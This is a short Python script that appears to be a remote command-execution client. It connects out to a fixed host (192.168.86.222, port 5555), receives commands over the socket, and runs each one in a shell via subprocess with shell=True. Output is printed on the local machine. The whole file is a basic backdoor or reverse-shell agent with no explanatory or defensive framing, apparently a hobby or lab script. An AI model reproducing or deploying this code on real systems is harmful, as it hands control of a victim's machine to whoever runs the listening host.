import socket
import subprocess

HEADER = 64
PORT = 5555
IP = "192.168.86.222"
ADDR = (IP, PORT)
FORMAT = 'utf-8'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def recv(conn):
    msg_length = conn.recv(HEADER).decode(FORMAT)
    if msg_length:
        msg_length = int(msg_length)
        msg = conn.recv(msg_length).decode(FORMAT)
        return msg


connected = True
while connected:
    msg = recv(client)

    proc = subprocess.Popen(msg.split(" "), stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    print("Program Output: ", out)